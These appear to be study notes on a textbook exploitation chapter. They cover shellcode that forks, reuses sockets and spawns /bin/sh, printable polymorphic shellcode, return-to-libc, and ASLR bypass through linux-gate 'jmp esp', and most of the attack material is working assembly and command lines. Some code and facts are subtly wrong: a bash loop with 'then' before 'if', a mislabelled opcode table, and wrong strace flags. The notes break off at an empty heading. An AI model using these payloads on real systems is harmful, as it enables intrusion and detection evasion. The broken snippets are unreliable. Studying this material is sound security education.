## x600
### Key concepts/definitions to know.
- **Daemon** - a daemon is a process that runs in the background, detached from the controlling terminal. 
- **Signals** - Signals are how processed communicate to one another in linux, when a program recieved a signal its execution flow is halted to call a signal handler.
  - The ```kill``` command can be used to send signals to a running process.
  - A program's behavior when a signal is recieved can be changed with the ```signal``` function ex: ```signal(SIGTERM, made_up_function)```
  - ```strace``` can be used to inspect the systemcalls of an executable. 
    - more importantly, it can be attached to a running process with ```j``` and you can filter calls with ```f```
  - When trying to find byte values for function/system call arguments it may be easier to simply put them in a C file and dissaseemble them and check out the values passed there. 

### Repairing Broken Execution Flow 
If you exploit a system daemon more times than not, you will disturb execution flow. If this happens, there are a couple things you need to do to ensure that execution flow is restored to normal.
  1. **Restore the base pointer**- Because you want the stack to return to the state it was when you decided to break it you need to ensure that you restore its state. To do so, you need to check out he function prologue of the function you overtook and get the offset of ```ESP``` from ```EBP``` and recreate this activity. Your code will look something like.
      ```
      lea ebp, [esp+0x69]   ; 0x69 is the original offset of ebp in the calling function(main)
      ```
      *Note- set breakpoints before and after your shellcode to observe these changes*
      *Note2- The code wil do the math to fix ESP itself, ebp is your problem*
  2. **Restore the return address** - After you fix the stack you broke, you have to point the program in the right direction before it can resume.  
      ```
      push 0xdeadbeef        ; 0xdeadbeef is the address of the next call after the function
      ret                    ; Tells the program to return to the address off the stack. 
      ```
### Using a child process
Because you want to be sneaky and ensure that the program you hacked doesnt break, you want to move your shellcode into a new process, this is done simply with the concept of forking.
<details> <summary>fork(2) man page</summary>

  ```
  FORK(2)                 Linux Programmer's Manual                FORK(2)

  NAME         

        fork - create a child process

  SYNOPSIS         

        #include <unistd.h>

        pid_t fork(void);

  DESCRIPTION         

        fork() creates a new process by duplicating the calling process.
        The new process is referred to as the child process.  The calling
        process is referred to as the parent process.

        The child process and the parent process run in separate memory
        spaces.  At the time of fork() both memory spaces have the same
        content.  Memory writes, file mappings (mmap(2)), and unmappings
        (munmap(2)) performed by one of the processes do not affect the
        other.

        The child process is an exact duplicate of the parent process
        except for the following points:

        *  The child has its own unique process ID, and this PID does not
            match the ID of any existing process group (setpgid(2)) or
            session.

        *  The child's parent process ID is the same as the parent's
            process ID.
  ```
</details>

It is important to remember that the fork process returns 0 for the child process and the new PID to the parent process. So we need to send the execution of out shellcode into the new process and use the concept above to send the parent back to normal. The code will look something like. 
```
BITS 32

   push BYTE 0x02    ; Fork is syscall #2
   pop eax
   int 0x80          ; After the fork, in child process eax == 0.
   test eax, eax
   jz child_process  ; In child process spawns a shell.

; In the parent process, restore tinywebd.
   lea ebp, [esp+0x68]  ; Restore EBP.
   push 0x08048fb7      ; Return address.
   ret                  ; Return

child_process:
; s = socket(2, 1, 0)
  push BYTE 0x66    ; Socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later.
  xor ebx, ebx      ; ebx is the type of socketcall.
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor.
```
*Note: Since fork returns a 0 in eax, upon success you can use the ```jz``` instruction to jump the new code into a child process*

### Socket Reuse
In the event you want to be even more sneaky and ride your "legitimate" connection for your resulting shellcode to do so, you simply grab the connection's file descriptor for your shell code and plug it into your ```dup2``` call. Because memory is dynamic it would be better to use a relative address for the file descriptor such as its relation to the stack. After sucess, your shellcode should look like this. 
```
child_process:
      ; Re-use existing socket.
   lea edx, [esp+0x5c]  ; Put the address of new_sockfd in edx.
   mov ebx, [edx]       ; Put the value of new_sockfd in ebx.
   push BYTE 0x02
   pop ecx          ; ecx starts at 2.
   xor eax, eax
   xor edx, edx
dup_loop:
   mov BYTE al, 0x3F ; dup2  syscall #63
   int 0x80          ; dup2(c, 0)
   dec ecx           ; Count down to 0.
   jns dup_loop      ; If the sign flag is not set, ecx is not negative.
```
This method only works if your exploit buffer includes a directive to redirect standard in/out to the target such as using ```cat -``` and piping it to netcat. In this situation, there is no need for a seperate listener since you ride the same connection. 

### String encoding
While this sounds fancy and all, this can be as simple as a ceaser cypher style substitution such as adding 6 bytes to all the values and then removing them afterwards. To do so your code can look a little like this. 

<details>

  ```
    child_process:
        ; Re-use existing socket.
      lea edx, [esp+0x5c]  ; Put the address of new_sockfd in edx.
      mov ebx, [edx]       ; Put the value of new_sockfd in ebx.
      push BYTE 0x02
      pop ecx          ; ecx starts at 2.
      xor eax, eax
    dup_loop:
      mov BYTE al, 0x3F ; dup2  syscall #63
      int 0x80          ; dup2(c, 0)
      dec ecx           ; Count down to 0.
      jns dup_loop      ; If the sign flag is not set, ecx is not negative

    ; execve(const char *filename, char *const argv [], char *const envp[])
      mov BYTE al, 11   ; execve  syscall #11
      push 0x056d7834   ; push "/sh\x00" encoded +5 to the stack.
      push 0x736e6734   ; push "/bin" encoded +5 to the stack.
      mov ebx, esp      ; Put the address of encoded "/bin/sh" into ebx.

    int3 ; Breakpoint before decoding (REMOVE WHEN NOT DEBUGGING)

      push BYTE 0x8     ; Need to decode 8 bytes
      pop edx
    decode_loop:
      sub BYTE [ebx+edx], 0x5
      dec edx
      jns decode_loop

    int3  ; Breakpoint after decoding (REMOVE WHEN NOT DEBUGGING)

      xor edx, edx
      push edx          ; push 32-bit null terminator to stack.
      mov edx, esp      ; This is an empty array for envp.
      push ebx          ; push string addr to stack above null terminator.
      mov ecx, esp      ; This is the argv array with string ptr.
      int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
  ```
</details>

Another thing we can do to hide is to get rid of our NOP sled and replace it with other special characters that can do and undo actions like. 

<details>
  <table>
    <thead>
      <tr>
        <th>Instruction</th>
        <th>Hex</th>
        <th>ASCII</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>inc eax</td>
        <td>0x40</td>
        <td>@</td>
      </tr>
      <tr>
        <td>inc ebx</td>
        <td>0x43</td>
        <td>C</td>
      </tr>
      <tr>
        <td>inc ecx</td>
        <td>0x41</td>
        <td>A</td>
      </tr>
      <tr>
        <td>inc ecx</td>
        <td>0x42</td>
        <td>B</td>
      </tr>
      <tr>
        <td>dec eax</td>
        <td>0x48</td>
        <td>H</td>
      </tr>
      <tr>
        <td>dec ebx</td>
        <td>0x4B</td>
        <td>K</td>
      </tr>
      <tr>
        <td>dec ecx</td>
        <td>0x49</td>
        <td>I</td>
      </tr>
      <tr>
        <td>dec edx</td>
        <td>0x4A</td>
        <td>J</td>
      </tr>
    </tbody>
  </table>
</details>

### Polymorphic Shellcode
As detection systems continue to get stronger, continually clever methods of sneaking shell-code must be devised. One of the biggest roadblocks in printable character checks. If you can create shellcode that is completely printable, then you can paste these instructions into input buffers opening the door for even more opportunities. 

#### Zeroing out registers
Since the XOR instruction is not printable we have to find a new way to zero characters. The simplest way of doing so is with a bitwise AND operation. 
  - **Logical ANDS** - since the ```and eax``` bitwise operation translates to ```%``` it can be used in conjunction with numbers that translate to printable chacacters to perform logic operations on numbers. Since AND requires both Bytes to be present , two AND operations againt s register with inverse values should zero it out.
    <details>
    <summary>Example</summary>

    ```
    and eax, 0x454e4f4a  ; Assembles into %JONE
    and eax, 0x3a313035  ; Assembles into %501:
    ------------------------------------  --------------- 
        Binary                                Hexadecimal
        1000101010011100100111101001010       0x454e4f4a
    AND 0111010001100010011000000110101   AND 0x3a313035
    ------------------------------------  --------------- 
        0000000000000000000000000000000       0x00000000
    ```
#### Loader Code
When youre in a situation in which you are constrained to printable characters, a loader can be a helpful method of controling execution flow. The loader leverages the stack's nature to grow down into lower memory by first pushing the stack pointer to an offset past EIP (into higher addresses) and growing an increasingly larger buffer until the stack can be flowed into after the loader code that specified this behavior. This behavior is illustrated below.
![Loader](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781593271442/files/httpatomoreillycomsourcenostarchimages254398.png.jpg)

1. The shellcode must be moved to a higher address, and since only the ```sub```traction instruction is printable with EAX, we take advantage of the fact that subtracting large values is effectively addition for this case so we have to find large printable numbers. Since the ```sub esp``` instruction is not printable, we have to do this in ```eax``` and then move the result into ```esp``` via the stack since ```push eax``` and ```pop esp``` are both printable. If this doesnt make sense, this is what it looks like in practice.  
    ```
    push esp             ; Assembles into T
    pop eax              ; Assembles into X

    sub eax, 0x39393333  ; Assembles into -3399
    sub eax, 0x72727550  ; Assembles into -Purr
    sub eax, 0x54545421  ; Assembles into -!TTT

    push eax             ; Assembles into P
    pop esp              ; Assembles into \
    ```
    *Note: this whole sequence translates to ```TX-3399-Purr-!TTT-P\```*

2. From here we have to actually build the shellcode. Since we are doing this on the stack we have to follow the FILO convention of the stack and build this backwards. so the first thing pushed to the stack is the last 4 bytes of shellcode. THis is done 4 bytes at a time until the entirety of the shellcode is on the stack. Each 4 bytes is pushed to the stand and then has subtraction with printable characters done on it to create the next value to be pushed to the stack. The resulting code looks like this
    ```
    and eax,0x454e4f4a
    and eax,0x3a313035      ; Zero out EAX.

    sub eax,0x346d6d25      ; Subtract printable values 
    sub eax,0x256d6d25      ;   to make EAX = 0x80cde189.
    sub eax,0x2557442d      ;   (last 4 bytes from shellcode.bin)
    push eax                ; Push these bytes to stack at ESP.
    sub eax,0x59316659      ; Subtract more printable values
    sub eax,0x59667766      ;  to make EAX = 0x53e28951.
    sub eax,0x7a537a79      ;  (next 4 bytes of shellcode from the end)

    push eax
    sub eax,0x25696969
    sub eax,0x25786b5a
    sub eax,0x25774625
    push eax                ; EAX = 0xe3896e69
    sub eax,0x366e5858
    sub eax,0x25773939
    sub eax,0x25747470
    push eax                ; EAX = 0x622f6868
    ---This keeps repeating for the whole shellcode---
    ```
    *Note: *
3. The rest of the space between the shellcode and EIP is padded with NOP instructions which are pushed to the stack as well.
    ```
    sub eax,0x41704170
    sub eax,0x2d772d4e
    sub eax,0x32483242
    push eax                ; EAX = 0x90909090
    push eax
    push eax                ; Build a NOP sled.
    ---Do this a bunch---
    ```
Your final code should disassemble into entirely printable characters that you can paste in the input buffer.
<details>
<summary>Printable Shell Code</summary>

```
BITS 32
push esp                ; Put current ESP
pop eax                 ;   into EAX.
sub eax,0x39393333      ; Subtract printable values
sub eax,0x72727550      ;   to add 860 to EAX.
sub eax,0x54545421
push eax                ; Put EAX back into ESP.
pop esp                 ;   Effectively ESP = ESP + 860
and eax,0x454e4f4a
and eax,0x3a313035      ; Zero out EAX.

sub eax,0x346d6d25      ; Subtract printable values 
sub eax,0x256d6d25      ;   to make EAX = 0x80cde189.
sub eax,0x2557442d      ;   (last 4 bytes from shellcode.bin)
push eax                ; Push these bytes to stack at ESP.
sub eax,0x59316659      ; Subtract more printable values
sub eax,0x59667766      ;  to make EAX = 0x53e28951.
sub eax,0x7a537a79      ;  (next 4 bytes of shellcode from the end)

push eax
sub eax,0x25696969
sub eax,0x25786b5a
sub eax,0x25774625
push eax                ; EAX = 0xe3896e69
sub eax,0x366e5858
sub eax,0x25773939
sub eax,0x25747470
push eax                ; EAX = 0x622f6868
sub eax,0x25257725
sub eax,0x71717171
sub eax,0x5869506a
push eax                ; EAX = 0x732f2f68
sub eax,0x63636363
sub eax,0x44307744
sub eax,0x7a434957
push eax                ; EAX = 0x51580b6a
sub eax,0x63363663
sub eax,0x6d543057
push eax                ; EAX = 0x80cda4b0
sub eax,0x54545454
sub eax,0x304e4e25
sub eax,0x32346f25
sub eax,0x302d6137
push eax                ; EAX = 0x99c931db
sub eax,0x78474778
sub eax,0x78727272
sub eax,0x774f4661
push eax                ; EAX = 0x31c03190
sub eax,0x41704170
sub eax,0x2d772d4e
sub eax,0x32483242
push eax                ; EAX = 0x90909090
push eax
push eax                ; Build a NOP sled.
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
```
</details>

### Return to Libc
The introduction of the non-executable stack threw a wrench in a lot of people's exploits and made people get a little more crafty. Because of this, libc is a standard c library that contains a few important functions such as ```exit``` and ```printf``` the best function to use for our purposes is ```system``` which is always at the same location and only changes when libc is recompiled. Easiest way to find the location is creating a dummy program that uses ```system()``` and sending it through gdb to ```print system```.

Since the stack is not executable, the shell code isnt out best route and its much easier ot just call the address of ```system()``` with the ```\bin\sh``` argument. This string should be stuffed into an environmental variable and then passed to the program with the relevant offset to override the return address with ```system()```, a 4 byte string to cover the return variable, and finally, the address of the environmental variable you stuffed your argument in. EX: ``` ./vuln $(perl -e 'print "ABCD"x7 . "\x80\x0d\xed\xb7FAKE\x5b\xfe\xff\xbf"')```

### Randomizing The Stack
Up to this point, all the points have been made with the assumption that memory locations wont change, which isn't the case in modern environments. The introduction of ASLR makes it so memory is not in the exact same location every time, but with a few tricks, we can get an idea of around where our intended locations are, with a degree of error of course.
#### Finding ret address offset.
One of the easiest ways to find the offset to the return address in a variable vulnerable to buffer overflow is to create a bash script that slowly increases the buffer until you get a segfault. This one should work, with some tweaks of course
```
for i in $(seq 1 50)
  do
    echo "Trying offset of $i words"
    ./aslr_demo $(perl -e "print 'AAAA'x$i")
    then
    if [ $? != 1 ]
    echo "==>  Correct offset to return address is $i words"
    break
    fi
  done
```
#### Linux-Gate
In linux versions 2.6.17 and before, the linux-gate.so object always contains the same location in memory. Since this object is always in the same location, we can take advantage of the instructions that reside in this static location, namely ```jmp esp```. The Below program should help you find one of these.
<details>

```c
int main()
{
  unsigned long linuxgate_start = 0xffffe000;
  char *ptr = (char *) linuxgate_start;

  int i;

  for(i=0; i < 4096; i++)
  {
    if(ptr[i] == '\xff' && ptr[i+1] == '\xe4')
      printf("found jmp esp at %p\n", ptr+i);
  }
}
```
</details>  

Since this instruction bounces program execution back to the stack pointer, and the stack pointer is right after the return address, we can just override the return address with ```jmp esp``` and esp with some shellcode stuffed in an environmental variable. EX: ```./aslr_demo $(perl -e 'print "\x77\xe7\xff\xff"x20')$(cat
 scode.bin)```

 #### Nested ```execl()```
 